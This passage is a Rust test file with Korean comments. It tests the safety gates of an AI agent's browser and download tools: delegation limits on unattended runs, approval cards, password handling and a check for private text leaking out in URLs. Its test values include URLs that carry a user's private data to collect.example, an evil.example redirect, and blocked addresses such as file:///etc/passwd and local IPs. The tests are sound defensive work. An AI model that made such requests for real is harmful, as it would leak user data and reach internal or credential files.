        matches!(&out, Reply::Note(t) if t.contains("위임한 사이트가 아니라")),
        "위임 밖 링크는 누르지 않는다: {out:?}"
    );

    // 넘겨주기로 위임 밖에 도착하면 화면을 돌려주지 않는다.
    s.browser
        .pages
        .lock()
        .unwrap()
        .push_back(Ok(page_at("https://tracker.evil.example/landing")));
    let out = crate::delegation::CALLER
        .scope(
            unattended(),
            s.tools.open(PAGE, Some("followup-grant-test")),
        )
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("이동한 곳이 위임 밖")),
        "{out:?}"
    );

    let id = s
        .store
        .lock()
        .unwrap()
        .site_grants_for("www.example.com", chrono::Utc::now())
        .unwrap()[0]
        .id
        .clone();
    s.store
        .lock()
        .unwrap()
        .revoke_site_grant(&id, chrono::Utc::now())
        .unwrap();
    let out = crate::delegation::CALLER
        .scope(
            unattended(),
            s.tools.open(PAGE, Some("followup-grant-test")),
        )
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("위임한 사이트가 아니라")),
        "거두면 다음 호출부터 묻는다: {out:?}"
    );

    // 사람이 대화 중이면 위임과 상관없이 연다(지금처럼).
    s.browser
        .pages
        .lock()
        .unwrap()
        .push_back(Ok(page_at("https://elsewhere.example/a")));
    let out = s
        .tools
        .open("https://elsewhere.example/a", Some("chat-1"))
        .await;
    assert!(matches!(out, Reply::Page(_)), "{out:?}");
}

/// 로그인을 위임한 사이트(결정 0028): 사람 없는 실행이 로그인 페이지로 튕기면 저장된 로그인으로 카드 없이 다시
/// 로그인한다. 위임이 로그인을 허용하지 않으면 길게 사는 재로그인 카드를 올린다(결정 0030).
#[tokio::test]
async fn delegated_sites_log_in_again_without_asking() {
    let mut s = setup(Duration::from_millis(50));
    s.store
        .lock()
        .unwrap()
        .set_setting("browser.site.quasarzone.username", "me", chrono::Utc::now())
        .unwrap();
    s.secrets
        .0
        .lock()
        .unwrap()
        .insert("site-quasarzone".into(), r#"{"password":"pw-1"}"#.into());
    let mut bounced = FakeBrowser::page("로그인", true);
    bounced.login_redirect = true;
    s.browser
        .pages
        .lock()
        .unwrap()
        .push_back(Ok(bounced.clone()));
    grant(&s, "quasarzone.com", true, false);
    let out = crate::delegation::CALLER
        .scope(
            unattended(),
            s.tools
                .open("https://quasarzone.com/bbs/x", Some("followup-grant-test")),
        )
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("저장된 로그인으로 다시 로그인했다")),
        "{out:?}"
    );
    assert!(s.posts.try_recv().is_err(), "카드 없이");
    assert_eq!(s.browser.passwords.lock().unwrap().as_slice(), ["pw-1"]);

    // 로그인을 위임하지 않았으면 재로그인 카드(사람 없는 실행이라 길게 산다).
    let id = grant(&s, "quasarzone.com", false, false);
    s.store
        .lock()
        .unwrap()
        .revoke_site_grant(&id, chrono::Utc::now())
        .unwrap();
    grant(&s, "bbs.quasarzone.com", false, false);
    let mut bounced2 = bounced;
    bounced2.url = "https://bbs.quasarzone.com/x".into();
    s.browser.pages.lock().unwrap().push_back(Ok(bounced2));
    let out = crate::delegation::CALLER
        .scope(
            unattended(),
            s.tools
                .open("https://bbs.quasarzone.com/x", Some("followup-grant-test")),
        )
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("이어서 다시 맡긴다")),
        "{out:?}"
    );
    let card = s.posts.try_recv().unwrap();
    let a = s.store.lock().unwrap().approval(&card).unwrap().unwrap();
    assert_eq!(a.kind, crate::approvals::KIND_SITE_LOGIN);
    assert!(a.expires_at > chrono::Utc::now() + chrono::Duration::hours(11));
    assert_eq!(a.payload["defer_quiet"], true);
}

/// 출구 검사(결정 0029): 읽은 비공개 자료가 주소에 실리면 기록하고(도메인과 까닭만), "막기"면 열지 않는다.
#[tokio::test]
async fn private_text_in_addresses_is_logged_or_blocked() {
    let s = setup(Duration::from_millis(50));
    crate::leak::record("다음 주 목요일 오후 네 시 치과 정기 검진 예약이 확정되었습니다");
    let url = "https://collect.example/p?d=다음주목요일오후네시치과정기검진";
    s.browser.pages.lock().unwrap().push_back(Ok(page_at(url)));
    let out = s.tools.open(url, Some("chat-1")).await;
    assert!(matches!(out, Reply::Page(_)), "기록만 모드는 연다: {out:?}");
    let flagged = s
        .store
        .lock()
        .unwrap()
        .recent_activity(5)
        .unwrap()
        .into_iter()
        .find(|a| a.kind == "egress_flag")
        .unwrap();
    assert!(flagged.summary.contains("collect.example") && flagged.summary.contains("기록만"));
    assert!(!flagged.summary.contains("치과"), "걸린 글은 남기지 않는다");
    s.store
        .lock()
        .unwrap()
        .set_setting(crate::leak::MODE_KEY, "block", chrono::Utc::now())
        .unwrap();
    let out = s.tools.open(url, Some("chat-1")).await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("사용자 자료로 보이는 글")),
        "{out:?}"
    );
    let out = s
        .tools
        .open("https://www.google.com/search?q=rust+tokio", Some("chat-1"))
        .await;
    assert!(
        !matches!(&out, Reply::Note(t) if t.contains("사용자 자료")),
        "평범한 검색은 그냥"
    );
}

/// 사람 없는 실행이 동작 위임 없는 사이트에서 POST를 누르면 카드가 12시간 살고 이어 하기 정보를 싣는다(결정 0030).
/// 카드를 만들 때 저장소 잠금을 두 번 잡아 멈추던 것을 막는 시험이기도 하다.
#[tokio::test]
async fn unattended_approval_cards_live_long_and_carry_resume() {
    let mut s = setup(Duration::from_millis(50));
    crate::runctx::register(
        "followup-card-test",
        crate::runctx::RunCtx {
            resume: Some(crate::runctx::Resume {
                task: "LMS 확인".into(),
                origin: "followup".into(),
                conversation: None,
                depth: 0,
            }),
            ..crate::runctx::RunCtx::default()
        },
    );
    grant(&s, "example.com", false, false);
    show(&s, vec![post_button()]).await;
    let caller = crate::delegation::Caller {
        run: "followup-card-test".into(),
        human: false,
    };
    let out = tokio::time::timeout(
        Duration::from_secs(5),
        crate::delegation::CALLER
            .scope(caller, s.tools.act(click("e4"), Some("followup-card-test"))),
    )
    .await
    .expect("멈추지 않는다");
    assert!(matches!(out, Reply::Note(_)), "{out:?}");
    let id = s.posts.try_recv().unwrap();
    let a = s.store.lock().unwrap().approval(&id).unwrap().unwrap();
    assert_eq!(a.kind, crate::approvals::KIND_BROWSER_ACTION);
    assert!(a.expires_at > chrono::Utc::now() + chrono::Duration::hours(11));
    assert_eq!(a.payload["resume"]["task"], "LMS 확인");
    assert_eq!(a.payload["defer_quiet"], true);
}

/// 로그인을 위임한 사이트는 대화 중에도 다시 묻지 않는다(결정 0028).
#[tokio::test]
async fn login_grants_apply_in_chat_too() {
    let mut s = setup(Duration::from_millis(50));
    s.store
        .lock()
        .unwrap()
        .set_setting("browser.site.quasarzone.username", "me", chrono::Utc::now())
        .unwrap();
    s.secrets
        .0
        .lock()
        .unwrap()
        .insert("site-quasarzone".into(), r#"{"password":"pw-2"}"#.into());
    grant(&s, "quasarzone.com", true, false);
    let mut bounced = FakeBrowser::page("로그인", true);
    bounced.login_redirect = true;
    s.browser.pages.lock().unwrap().push_back(Ok(bounced));
    let chat = crate::delegation::Caller {
        run: "chat-9".into(),
        human: true,
    };
    let out = crate::delegation::CALLER
        .scope(
            chat,
            s.tools.open("https://quasarzone.com/bbs/x", Some("chat-9")),
        )
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("저장된 로그인으로 다시 로그인했다")),
        "{out:?}"
    );
    assert!(s.posts.try_recv().is_err(), "카드 없이");
}

/// 권한 모드(결정 0040): 해제이고 사람이 대화 중이면 승인 동작을 묻지 않고(사람이 승인한 것처럼) 하고, 사람 없는
/// 실행은 그대로 카드, 금지는 해제에서도 금지. 엄격이면 그냥 하던 글 넣기도 묻고, 링크 이동은 그대로 한다.
#[tokio::test]
async fn security_modes_adjust_browser_gates() {
    let mut s = setup(Duration::from_millis(300));
    let set = |s: &Setup, m: crate::security::Mode| {
        crate::security::set_mode(&s.store.lock().unwrap(), m, "시험", Utc::now()).unwrap();
    };
    let chat = crate::delegation::Caller {
        run: "chat-9".into(),
        human: true,
    };
    let elements = vec![
        post_button(),
        link("e1", "다음 글", "https://www.example.com/board/2"),
        link("e2", "로그아웃", "https://www.example.com/logout"),
        element("e3", "text", "검색어"),
        element("e5", "button", "추천"),
    ];
    show(&s, elements.clone()).await;
    set(&s, crate::security::Mode::Open);
    // 해제(대화 중): 무엇을 하는지 모르는 단추 같은 가벼운 확인은 건너뛴다.
    let out = crate::delegation::CALLER
        .scope(chat.clone(), s.tools.act(click("e5"), Some("chat-9")))
        .await;
    assert!(matches!(out, Reply::Page(_)), "{out:?}");
    assert!(s.posts.try_recv().is_err(), "해제(대화 중)는 카드 없음");
    assert!(
        s.browser
            .expects
            .lock()
            .unwrap()
            .last()
            .cloned()
            .flatten()
            .unwrap()
            .approved,
        "사람이 승인한 것처럼"
    );
    assert!(
        s.store
            .lock()
            .unwrap()
            .recent_activity(10)
            .unwrap()
            .iter()
            .any(|a| a.kind == "browser_open_mode")
    );
    // 바깥에 남는 쓰기(글 등록)는 해제에서도 승인 카드를 거친다(결정 0059).
    show(&s, elements.clone()).await;
    let out = crate::delegation::CALLER
        .scope(chat.clone(), s.tools.act(click("e4"), Some("chat-9")))
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("승인이 필요한 동작")),
        "{out:?}"
    );
    assert!(s.posts.try_recv().is_ok(), "해제여도 글 등록은 카드");
    // 로그아웃은 사람이 대화 중이면 그냥 한다. 사람 없는 실행은 하지 않는다.
    show(&s, elements.clone()).await;
    s.browser.pages.lock().unwrap().push_back(Ok(page_at(PAGE)));
    let out = crate::delegation::CALLER
        .scope(chat.clone(), s.tools.act(click("e2"), Some("chat-9")))
        .await;
    assert!(matches!(out, Reply::Page(_)), "{out:?}");
    show(&s, elements.clone()).await;
    let _ = crate::delegation::CALLER
        .scope(unattended(), s.tools.act(click("e4"), Some("followup-9")))
        .await;
    assert!(s.posts.try_recv().is_ok(), "사람 없는 실행은 해제여도 카드");

    set(&s, crate::security::Mode::Strict);
    show(&s, elements).await;
    let out = crate::delegation::CALLER
        .scope(chat.clone(), s.tools.act(click("e1"), Some("chat-9")))
        .await;
    assert!(
        matches!(out, Reply::Page(_)),
        "엄격에서도 링크 이동은 그냥: {out:?}"
    );
    show(&s, vec![element("e3", "text", "검색어")]).await;
    let _ = crate::delegation::CALLER
        .scope(chat, s.tools.act(typing("e3", false), Some("chat-9")))
        .await;
    assert!(s.posts.try_recv().is_ok(), "엄격이면 글 넣기도 묻는다");
}

fn with_downloads(s: &Setup) -> crate::downloads::tests::Setup {
    let d = crate::downloads::tests::setup();
    s.tools.set_downloads(d.downloads.clone());
    d
}

fn fetched(d: &crate::downloads::tests::Setup) -> Vec<(String, crate::watch::Via)> {
    d.fetch.called.lock().unwrap().clone()
}

/// 결정 0057: `file_download`는 `browser_open`과 같은 검사를 거친다(내부 주소, 사람 없는 실행의 위임 범위,
/// 나가는 글 검사). 로그인 세션은 사람이 대화 중이면 어느 사이트든, 사람 없는 실행은 위임한 사이트만이다.
#[tokio::test]
async fn file_downloads_pass_the_same_gates_as_opening_a_page() {
    use crate::downloads::tests::file;
    use crate::watch::Via;
    let mut s = setup(Duration::from_millis(50));
    let d = with_downloads(&s);
    let zip = "https://files.example.com/pack.zip";
    d.fetch
        .answer(zip, Ok(file(b"PK\x03\x04data", "application/zip", zip)));
    let out = s.tools.download(zip, true, None, Some("chat-1")).await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("받았다: id=f_") && t.contains("pack.zip") && t.contains("zipfile")),
        "{out:?}"
    );
    assert_eq!(fetched(&d), vec![(zip.to_owned(), Via::Session)]);
    // 내부 주소와 차단 목록은 받지 않는다(가져오기 전에 막는다).
    for bad in [
        "http://192.168.0.5/backup.zip",
        "https://localhost/x.zip",
        "file:///etc/passwd",
        "https://claude.ai/export.zip",
    ] {
        let out = s.tools.download(bad, false, None, Some("chat-1")).await;
        assert!(
            matches!(&out, Reply::Note(t) if t.contains("받을 수 없는 주소다")),
            "{bad}: {out:?}"
        );
    }
    assert_eq!(fetched(&d).len(), 1);
    // 사람 없는 실행: 위임 밖은 받지 않고 카드로 묻는다. 위임한 사이트는 받는다.
    let out = crate::delegation::CALLER
        .scope(
            unattended(),
            s.tools
                .download(zip, false, None, Some("followup-grant-test")),
        )
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("위임한 사이트가 아니라")),
        "{out:?}"
    );
    let card = s.posts.try_recv().unwrap();
    assert_eq!(
        s.store
            .lock()
            .unwrap()
            .approval(&card)
            .unwrap()
            .unwrap()
            .kind,
        crate::delegation::KIND_SITE_EGRESS
    );
    assert_eq!(fetched(&d).len(), 1, "받지 않았다");
    grant(&s, "example.com", false, false);
    let out = crate::delegation::CALLER
        .scope(
            unattended(),
            s.tools
                .download(zip, false, None, Some("followup-grant-test")),
        )
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("받았다: id=f_")),
        "{out:?}"
    );
    assert_eq!(fetched(&d).last().unwrap().1, Via::Plain);
    // 나가는 글 검사(결정 0029): "막기"면 사용자 자료가 실린 주소에서는 받지 않는다.
    crate::leak::record("내일 오전 열한 시 은행 대출 상담 예약이 확정되었습니다 지점 방문");
    s.store
        .lock()
        .unwrap()
        .set_setting(crate::leak::MODE_KEY, "block", chrono::Utc::now())
        .unwrap();
    let out = s
        .tools
        .download(
            "https://collect.example/f.zip?d=내일오전열한시은행대출상담예약",
            false,
            None,
            Some("chat-1"),
        )
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("사용자 자료로 보이는 글")),
        "{out:?}"
    );
    // 파일 받기가 이어지지 않은 데몬은 그렇다고 답한다.
    let bare = setup(Duration::from_millis(50));
    let out = bare.tools.download(zip, false, None, Some("chat-1")).await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("파일을 받을 수 없다")),
        "{out:?}"
    );
}

/// 결정 0057: 브라우저는 내려받지 않는다. 시작하려던 내려받기는 데몬이 로그인 세션으로 대신 받아 알린다.
/// 파일 주소를 바로 열었을 때(브라우저는 "중단됨")와 뷰어로 열린 PDF(읽을 글이 없는 화면)도 파일로 받는다.
#[tokio::test]
async fn downloads_started_in_the_browser_are_fetched_by_the_daemon() {
    use crate::browser::SeenDownload;
    use crate::downloads::tests::file;
    use crate::watch::Via;
    let s = setup(Duration::from_millis(50));
    let d = with_downloads(&s);
    let seen = |url: &str| SeenDownload {
        url: url.into(),
        name: "download".into(),
    };
    // 1. 링크를 눌렀더니 내려받기가 시작됐다(넘겨준 뒤의 저장소 주소로 온다).
    let stored = "https://cdn.example.net/blob/77?sig=abc";
    let mut got = file(b"%PDF-1.7 x", "application/octet-stream", stored);
    got.filename = Some("과제 안내.pdf".into());
    d.fetch.answer(stored, Ok(got));
    show(
        &s,
        vec![link(
            "e1",
            "과제 안내",
            "https://www.example.com/files/77/download",
        )],
    )
    .await;
    s.browser.pages.lock().unwrap().push_back(Ok(page_at(PAGE)));
    *s.browser.downloads.lock().unwrap() =
        vec![seen(stored), seen("blob:https://www.example.com/1")];
    let out = s.tools.act(click("e1"), Some("chat-1")).await;
    let Reply::PageWithNote { page, note } = &out else {
        panic!("{out:?}")
    };
    assert!(page.contains("결과 본문"));
    assert!(
        note.contains("데몬이 대신 받았다")
            && note.contains("과제 안내.pdf")
            && note.contains("id=f_"),
        "{note}"
    );
    assert!(note.contains("blob·data 주소"), "{note}");
    assert_eq!(fetched(&d), vec![(stored.to_owned(), Via::Session)]);
    let rendered = out.render();
    assert!(
        rendered.find("데몬이 대신 받았다").unwrap() < rendered.find("<external_data").unwrap(),
        "데몬의 말은 외부 데이터 밖에 있다: {rendered}"
    );
    // 2. 파일 주소를 바로 열면 브라우저는 열지 못하고, 조금 뒤 내려받기를 알린다.
    let direct = "https://www.example.com/files/9/download";
    d.fetch.answer(
        direct,
        Ok(file(b"PK\x03\x04zip", "application/zip", direct)),
    );
    s.browser
        .pages
        .lock()
        .unwrap()
        .push_back(Err(BrowserError::Failed(
            "페이지를 열 수 없다: net::ERR_ABORTED".into(),
        )));
    *s.browser.downloads.lock().unwrap() = vec![seen(direct)];
    let out = s.tools.open(direct, Some("chat-1")).await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("페이지가 아니라 파일") && t.contains("download.zip")),
        "{out:?}"
    );
    // 3. 뷰어로 열린 PDF: 화면에 글도 요소도 없으면 그 주소를 받아 본다. 파일이면 알린다.
    let pdf = "https://www.example.com/docs/guide.pdf";
    d.fetch
        .answer(pdf, Ok(file(b"%PDF-1.4 y", "application/pdf", pdf)));
    let blank = PageView {
        url: pdf.into(),
        ..PageView::default()
    };
    s.browser.pages.lock().unwrap().push_back(Ok(blank.clone()));
    let out = s.tools.open(pdf, Some("chat-1")).await;
    assert!(
        matches!(&out, Reply::PageWithNote { note, .. } if note.contains("페이지가 아니라 파일") && note.contains("guide.pdf") && note.contains("pymupdf")),
        "{out:?}"
    );
    // 글이 없는 화면이어도 페이지(HTML)면 저장하지 않고 화면만 돌려준다.
    let empty = "https://www.example.com/empty";
    d.fetch
        .answer(empty, Ok(file(b"<html></html>", "text/html", empty)));
    s.browser.pages.lock().unwrap().push_back(Ok(PageView {
        url: empty.into(),
        ..blank
    }));
    let out = s.tools.open(empty, Some("chat-1")).await;
    assert!(matches!(out, Reply::Page(_)), "{out:?}");
    assert_eq!(d.files.recent(10).len(), 3);
    // 4. 앞선 동작 뒤 늦게 시작된 내려받기는 다음 화면 읽기에서 받는다.
    s.browser.pages.lock().unwrap().push_back(Ok(page_at(PAGE)));
    *s.browser.downloads.lock().unwrap() = vec![seen(direct)];
    let out = s.tools.snapshot(Some("chat-1")).await;
    assert!(
        matches!(&out, Reply::PageWithNote { note, .. } if note.contains("id=f_")),
        "{out:?}"
    );
}

/// 결정 0059: 정책으로 못 하는 동작은 없다. 대신 바깥에 남는 쓰기와 돈·계정은 권한 모드와 상관없이 승인 카드를
/// 거치고, 로그아웃과 비밀번호 칸은 사람이 대화 중일 때만 그냥 한다. 사람 없는 실행의 규칙은 예전 그대로다.
#[tokio::test]
async fn nothing_is_forbidden_by_policy_but_writes_and_money_always_ask() {
    let shop = "https://shop.example.com/cart";
    // 등급.
    let pay = element("e1", "button", "결제하기");
    assert!(matches!(
        classify(&click("e1"), &pay, shop),
        Gate::Critical(_)
    ));
    let order = with_form(
        element("e2", "submit", "확인"),
        form("post", "https://shop.example.com/order/submit", false),
    );
    assert!(matches!(
        classify(&click("e2"), &order, shop),
        Gate::Critical(_)
    ));
    assert!(matches!(
        classify(
            &click("e3"),
            &element("e3", "button", "비밀번호 변경"),
            PAGE
        ),
        Gate::Critical(_)
    ));
    assert!(matches!(
        classify(&click("e4"), &post_button(), PAGE),
        Gate::Publish(_)
    ));
    assert!(matches!(
        classify(&click("e5"), &element("e5", "button", "댓글 등록"), PAGE),
        Gate::Publish(_)
    ));
    assert!(matches!(
        classify(&click("e6"), &element("e6", "button", "추천"), PAGE),
        Gate::Approval(_)
    ));
    let logout = link("e7", "로그아웃", "https://www.example.com/logout");
    assert!(matches!(
        classify(&click("e7"), &logout, PAGE),
        Gate::HumanOnly(_)
    ));
    let pw = element("e8", "password", "비밀번호");
    assert!(matches!(
        classify(&typing("e8", false), &pw, PAGE),
        Gate::HumanOnly(_)
    ));
    let login = with_form(
        element("e9", "submit", "로그인"),
        form("post", "https://www.example.com/login", true),
    );
    assert!(matches!(
        classify(&click("e9"), &login, PAGE),
        Gate::HumanOnly(_)
    ));
    // 파일 칸은 눌러서는 다룰 수 없다(올리기 도구를 쓴다). 되지 않는 것은 여전히 되지 않는다.
    assert!(matches!(
        classify(&click("e10"), &element("e10", "file", "첨부"), PAGE),
        Gate::Forbidden(w) if w.contains("browser_upload")
    ));

    // 동작: 권한 모드가 해제여도 결제 단추는 카드, 위임이 동작을 허용해도 카드. 사람 없는 실행은 하지 않는다.
    let mut s = setup(Duration::from_millis(50));
    crate::security::set_mode(
        &s.store.lock().unwrap(),
        crate::security::Mode::Open,
        "시험",
        Utc::now(),
    )
    .unwrap();
    grant(&s, "example.com", true, true);
    let chat = crate::delegation::Caller {
        run: "chat-1".into(),
        human: true,
    };
    show(&s, vec![pay.clone(), pw.clone(), post_button()]).await;
    let out = crate::delegation::CALLER
        .scope(chat.clone(), s.tools.act(click("e1"), Some("chat-1")))
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("승인이 필요한 동작") && t.contains("돈·계정")),
        "{out:?}"
    );
    let card = s.posts.try_recv().expect("결제는 늘 카드");
    assert_eq!(
        s.store
            .lock()
            .unwrap()
            .approval(&card)
            .unwrap()
            .unwrap()
            .kind,
        crate::approvals::KIND_BROWSER_ACTION
    );
    let out = crate::delegation::CALLER
        .scope(
            unattended(),
            s.tools.act(click("e1"), Some("followup-grant-test")),
        )
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("사람 없는 실행에서는 하지 않는다")),
        "{out:?}"
    );
    assert!(s.posts.try_recv().is_err());
    // 결제·주문 페이지에서는 가벼운 확인(Enter로 무엇이 실행될지 모르는 칸)도 해제 모드와 위임이 건너뛰지 못한다.
    grant(&s, "shop.example.com", true, true);
    let unknown = element("e6", "text", "쿠폰 코드");
    let view = PageView {
        url: "https://shop.example.com/order/checkout".into(),
        title: "주문".into(),
        text: "주문서".into(),
        element_total: 1,
        elements: vec![unknown.clone()],
        ..PageView::default()
    };
    s.browser.pages.lock().unwrap().push_back(Ok(view));
    *s.browser.url.lock().unwrap() = "https://shop.example.com/order/checkout".into();
    s.browser
        .elements
        .lock()
        .unwrap()
        .insert("e6".into(), unknown);
    let opened = crate::delegation::CALLER
        .scope(
            chat.clone(),
            s.tools
                .open("https://shop.example.com/order/checkout", Some("chat-1")),
        )
        .await;
    assert!(matches!(opened, Reply::Page(_)), "{opened:?}");
    let out = crate::delegation::CALLER
        .scope(
            chat.clone(),
            s.tools.act(typing("e6", true), Some("chat-1")),
        )
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("승인이 필요한 동작") && t.contains("결제·주문 페이지")),
        "{out:?}"
    );
    assert!(
        s.posts.try_recv().is_ok(),
        "결제 페이지에서는 모르는 Enter도 카드"
    );
    *s.browser.url.lock().unwrap() = PAGE.into();
    // 로그아웃도 사람 없는 실행은 하지 않는다(위임한 사이트여도).
    show(
        &s,
        vec![logout.clone(), pay.clone(), pw.clone(), post_button()],
    )
    .await;
    let out = crate::delegation::CALLER
        .scope(
            unattended(),
            s.tools.act(click("e7"), Some("followup-grant-test")),
        )
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("사람이 대화 중일 때만")),
        "{out:?}"
    );
    // 위임이 동작을 허용한 사이트의 글 등록은 묻지 않는다(사용자가 미리 허락했다).
    s.browser.pages.lock().unwrap().push_back(Ok(page_at(PAGE)));
    let out = crate::delegation::CALLER
        .scope(chat.clone(), s.tools.act(click("e4"), Some("chat-1")))
        .await;
    assert!(matches!(out, Reply::Page(_)), "{out:?}");
    assert!(s.posts.try_recv().is_err());
    // 비밀번호 칸: 사람이 대화 중이면 넣는다. 넣은 글은 활동 기록에 남지 않는다.
    show(&s, vec![pw.clone()]).await;
    s.browser.pages.lock().unwrap().push_back(Ok(page_at(PAGE)));
    let secret = Act::Type {
        r: "e8".into(),
        text: "hunter2-비밀".into(),
        submit: false,
    };
    let out = crate::delegation::CALLER
        .scope(chat.clone(), s.tools.act(secret.clone(), Some("chat-1")))
        .await;
    assert!(matches!(out, Reply::Page(_)), "{out:?}");
    let logged = s.store.lock().unwrap().recent_activity(20).unwrap();
    assert!(
        logged.iter().all(|a| !a.summary.contains("hunter2")),
        "{logged:?}"
    );
    // 엄격 모드에서는 입력을 묻는데, 비밀번호는 카드(저장소)에 남기지 않으려고 넣지 않는다.
    crate::security::set_mode(
        &s.store.lock().unwrap(),
        crate::security::Mode::Strict,
        "시험",
        Utc::now(),
    )
    .unwrap();
    show(&s, vec![pw]).await;
    let out = crate::delegation::CALLER
        .scope(chat, s.tools.act(secret, Some("chat-1")))
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("승인 카드로 미루지 않는다")),
        "{out:?}"
    );
    assert!(
        s.posts.try_recv().is_err(),
        "비밀번호가 든 카드는 만들지 않는다"
    );
    let approvals = s
        .store
        .lock()
        .unwrap()
        .recent_approvals(50)
        .unwrap_or_default();
    assert!(
        approvals
            .iter()
            .all(|a| !a.payload.to_string().contains("hunter2"))
    );
}

/// 결정 0059: 페이지에서 스크립트 돌리기와 파일 올리기. 사람이 대화 중일 때만 하고, 바깥에 쓰는 모양의 스크립트와
/// 파일 올리기는 승인 카드를 거친다. 읽기만 하는 스크립트는 바로 돈다.
#[tokio::test]
async fn page_scripts_and_uploads_ask_before_touching_the_outside() {
    let s = setup(Duration::from_millis(60));
    let store = s.store.clone();
    let (tx, mut cards) = mpsc::unbounded_channel();
    let gate = crate::actions::ActionGate::new(store.clone(), Some(tx));
    s.tools.set_actions(gate.clone());
    let chat = crate::delegation::Caller {
        run: "chat-1".into(),
        human: true,
    };
    // 사람이 대화 중인 실행으로 부른다.
    macro_rules! human {
        ($f:expr) => {
            crate::delegation::CALLER.scope(chat.clone(), $f)
        };
    }
    let approve = |id: String| {
        let (gate, store) = (gate.clone(), store.clone());
        async move {
            use crate::approvals::ApprovalKind as _;
            let approval = store.lock().unwrap().approval(&id).unwrap().unwrap();
            let ctx = crate::approvals::KindCtx {
                store: store.clone(),
                tz: chrono_tz::Asia::Seoul,
            };
            crate::actions::ActionKind { gate }
                .execute(&approval, &ctx, None)
                .await;
        }
    };
    // 화면을 연 적이 없으면 돌릴 곳이 없다. 사람 없는 실행은 하지 않는다.
    let out = human!(s.tools.eval("return 1", Some("chat-1"))).await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("browser_open")),
        "{out:?}"
    );
    let out = crate::delegation::CALLER
        .scope(unattended(), s.tools.eval("return 1", Some("followup-1")))
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("사람이 대화 중일 때만")),
        "{out:?}"
    );

    let file = element("e3", "file", "첨부");
    show(&s, vec![file.clone(), element("e4", "text", "제목")]).await;
    // 읽기만 하는 스크립트는 바로 돈다: 돌려준 값과 화면이 온다.
    s.browser.pages.lock().unwrap().push_back(Ok(page_at(PAGE)));
    let read = "return [...document.querySelectorAll('tr')].map(r => r.innerText)";
    let out = human!(s.tools.eval(read, Some("chat-1"))).await;
    assert!(
        matches!(&out, Reply::Page(t) if t.contains("[스크립트가 돌려준 값]") && t.contains("제목: 결과")),
        "{out:?}"
    );
    assert!(cards.try_recv().is_err(), "읽기는 묻지 않는다");
    // 요청을 보내는 스크립트는 승인 카드를 거친다. 답이 없으면 돌리지 않는다.
    let write = "await fetch('/api/post', {method: 'POST', body: 'x'}); return 'ok'";
    let before = s.browser.calls.lock().unwrap().len();
    let out = human!(s.tools.eval(write, Some("chat-1"))).await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("하지 않았다") && t.contains("다시 부르면")),
        "{out:?}"
    );
    assert_eq!(
        s.browser.calls.lock().unwrap().len(),
        before,
        "돌리지 않았다"
    );
    let card = cards.try_recv().expect("카드");
    let payload = store
        .lock()
        .unwrap()
        .approval(&card)
        .unwrap()
        .unwrap()
        .payload;
    assert!(
        payload["detail"].as_str().unwrap().contains("fetch("),
        "{payload}"
    );
    // 승인된 뒤 같은 스크립트를 다시 부르면 돈다(한 번만).
    approve(card).await;
    s.browser.pages.lock().unwrap().push_back(Ok(page_at(PAGE)));
    let out = human!(s.tools.eval(write, Some("chat-1"))).await;
    assert!(matches!(out, Reply::Page(_)), "{out:?}");
    assert!(
        s.browser
            .calls
            .lock()
            .unwrap()
            .iter()
            .any(|(k, v)| k == "eval" && v.contains("fetch("))
    );
    assert!(script_acts("document.forms[0].submit()") && script_acts("el.click()"));
    assert!(!script_acts("return document.title"));

    // 파일 올리기: 파일 칸이 아니면 하지 않고, 파일 칸이면 승인 카드를 거친다.
    // (스크립트를 돌린 뒤의 화면으로 참조가 새로 매겨졌으므로 화면을 다시 본다.)
    show(&s, vec![file.clone(), element("e4", "text", "제목")]).await;
    let out = human!(s.tools.upload("e4", "보고서.pdf", b"%PDF", Some("chat-1"))).await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("파일 칸이 아니다")),
        "{out:?}"
    );
    let out = crate::delegation::CALLER
        .scope(
            unattended(),
            s.tools.upload("e3", "보고서.pdf", b"%PDF", Some("f-1")),
        )
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("사람이 대화 중일 때만")),
        "{out:?}"
    );
    let out = human!(s.tools.upload("e3", "보고서.pdf", b"%PDF", Some("chat-1"))).await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("하지 않았다")),
        "{out:?}"
    );
    let card = cards.try_recv().expect("파일 올리기 카드");
    let what = store
        .lock()
        .unwrap()
        .approval(&card)
        .unwrap()
        .unwrap()
        .payload["what"]
        .clone();
    assert!(
        what.as_str().unwrap().contains("보고서.pdf")
            && what.as_str().unwrap().contains("example.com")
    );
    approve(card).await;
    s.browser.pages.lock().unwrap().push_back(Ok(page_at(PAGE)));
    let out = human!(s.tools.upload("e3", "보고서.pdf", b"%PDF", Some("chat-1"))).await;
    assert!(
        matches!(&out, Reply::PageWithNote { note, .. } if note.contains("아직 보낸 것은 아니다")),
        "{out:?}"
    );
    assert!(
        s.browser
            .calls
            .lock()
            .unwrap()
            .iter()
            .any(|(k, v)| k == "upload" && v == "e3 보고서.pdf 4")
    );
}
